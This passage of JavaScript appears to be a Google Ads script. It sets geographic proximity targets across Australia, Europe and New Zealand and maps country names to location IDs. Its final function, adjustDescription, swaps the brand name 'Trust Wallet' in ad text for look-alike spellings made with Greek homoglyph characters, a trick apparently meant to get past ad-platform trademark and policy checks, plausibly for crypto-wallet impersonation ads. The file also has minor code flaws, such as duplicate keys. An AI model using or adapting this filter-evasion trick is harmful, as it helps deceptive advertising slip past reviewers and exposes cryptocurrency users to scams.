            { latitude: -17.436632, longitude: 143.603687, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: -21.414232, longitude: 125.4323, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: -23.445129, longitude: 116.753101, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: -24.8087, longitude: 132.639331, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: -26.708346, longitude: 140.549487, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: -28.190203, longitude: 150.019702, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: -30.450591, longitude: 120.268726, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: -33.065788, longitude: 133.496265, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: -38.481135, longitude: 146.262378, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
        ],
        belgium: [
            // 5
            { latitude: 50.379593, longitude: 4.802881, radius: 150, radiusUnits: "MILES", bidModifier: 1 },
        ],
        denmark: [
            // 6
            { latitude: 55.835174, longitude: 10.568438, radius: 150, radiusUnits: "MILES", bidModifier: 1 },
        ],
        finland: [
            // 7
            { latitude: 61.944072, longitude: 25.49138, radius: 200, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 64.890887, longitude: 28.39177, radius: 200, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 67.945739, longitude: 25.842942, radius: 200, radiusUnits: "MILES", bidModifier: 1 },
        ],
        france: [
            // 8
            { latitude: 46.489448, longitude: 2.270628, radius: 400, radiusUnits: "MILES", bidModifier: 1 },
        ],
        germany: [
            // 9
            { latitude: 51.246908, longitude: 10.318127, radius: 300, radiusUnits: "MILES", bidModifier: 1 },
        ],
        ireland: [
            // 10
            { latitude: 53.178502, longitude: -8.174986, radius: 150, radiusUnits: "MILES", bidModifier: 1 },
        ],
        italy: [
            // 11
            { latitude: 37.912285, longitude: 15.174539, radius: 150, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 40.416152, longitude: 16.086405, radius: 150, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 40.849699, longitude: 9.071634, radius: 150, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 43.055383, longitude: 12.158792, radius: 150, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 44.710185, longitude: 8.796976, radius: 150, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 45.961212, longitude: 11.47764, radius: 150, radiusUnits: "MILES", bidModifier: 1 },
        ],
        luxembourg: [
            // 12
            { latitude: 49.807216, longitude: 6.097279, radius: 30, radiusUnits: "MILES", bidModifier: 1 },
        ],
        netherlands: [
            // 13
            { latitude: 51.488459, longitude: 5.983865, radius: 60, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 51.79526, longitude: 4.544656, radius: 60, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 52.763119, longitude: 6.412332, radius: 60, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 52.802989, longitude: 4.940164, radius: 60, radiusUnits: "MILES", bidModifier: 1 },
        ],
        "new zealand": [
            // 14
            { latitude: -41.27848, longitude: 172.578636, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
        ],
        norway: [
            // 15
            { latitude: 60.651961, longitude: 8.649067, radius: 200, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 65.385414, longitude: 9.176411, radius: 200, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 69.271935, longitude: 14.010396, radius: 200, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 70.988558, longitude: 25.831685, radius: 200, radiusUnits: "MILES", bidModifier: 1 },
        ],
        spain: [
            // 16
            { latitude: 40.206167, longitude: -3.947912, radius: 450, radiusUnits: "MILES", bidModifier: 1 },
        ],
        sweden: [
            // 17
            { latitude: 57.371578, longitude: 14.703752, radius: 170, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 59.842615, longitude: 15.494768, radius: 170, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 62.99317, longitude: 17.032854, radius: 170, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 66.712126, longitude: 19.274065, radius: 170, radiusUnits: "MILES", bidModifier: 1 },
        ],
        switzerland: [
            // 18
            { latitude: 46.962386, longitude: 8.101063, radius: 120, radiusUnits: "MILES", bidModifier: 1 },
        ],
        "united kingdom": [
            // 19
            { latitude: 51.311626, longitude: -2.121658, radius: 190, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 54.922311, longitude: -4.055252, radius: 190, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 57.85197, longitude: -4.340896, radius: 190, radiusUnits: "MILES", bidModifier: 1 },
        ],
    };
    var prox = [];
    for (var i = 0; i < targetedCountries.list.length; i++) {
        prox = prox.concat(targetProximities[targetedCountries.list[i]]);
    }
    return prox;
}

function getAllTargetCountries(countriesStr) {
    var _tragetedCountriesListTemp = countriesStr.split(";");
    var _tragetedCountriesList = [];
    for (var i = 0; i < _tragetedCountriesListTemp.length; i++) {
        _tragetedCountriesListTemp[i] = _tragetedCountriesListTemp[i].trim().toLowerCase();
        if (_tragetedCountriesListTemp[i]) {
            _tragetedCountriesList.push(_tragetedCountriesListTemp[i]);
        }
    }

    var countriesList = {
        canada: 2124,
        belgium: 2056,
        australia: 2036,
        "united kingdom": 2826,
        switzerland: 2756,
        sweden: 2752,
        spain: 2724,
        norway: 2578,
        "new zealand": 2554,
        netherlands: 2528,
        austria: 2040,
        cyprus: 2196,
        czechia: 2203,
        germany: 2276,
        greece: 2300,
        hungary: 2348,
        italy: 2380,
        poland: 2616,
        portugal: 2620,
        romania: 2642,
        slovakia: 2703,
        spain: 2724,
        "canary islands": 20277,
        russia: 2643,
        "united states": 2840,
        ukraine: 2804,
        belarus: 2112,
        india: 2356,
        kazakhstan: 2398,
        ukraine: 2804,
        denmark: 2208,
        finland: 2246,
        france: 2250,
        ireland: 2372,
        luxembourg: 2442,
    };
    var retObj = { ok: false };
    var array = [];
    var clKeys = Object.keys(countriesList);
    // Logger.log(_tragetedCountriesList, clKeys);
    for (var i = 0; i < clKeys.length; i++) {
        // Logger.log(_tragetedCountriesList.includes(clKeys[i]), clKeys[i], countriesList[clKeys[i]]);
        if (_tragetedCountriesList.includes(clKeys[i])) {
            array.push(countriesList[clKeys[i]]);
        }
    }
    if (array) {
        retObj.ok = true;
        retObj.array = array;
        retObj.list = _tragetedCountriesList;
        retObj.str = countriesStr;
    }
    return retObj;
}

function adjustDescription(description) {
    var array = ["Τust WaΙleτ", "Trυst WalΙet", "Τrust WaΙleτ", "Τrυst WalΙet", "Τιust WaΙΙeτ", "Τrυst Wallet"];
    return description.replace("Trust Wallet", shuffleArray(array));
}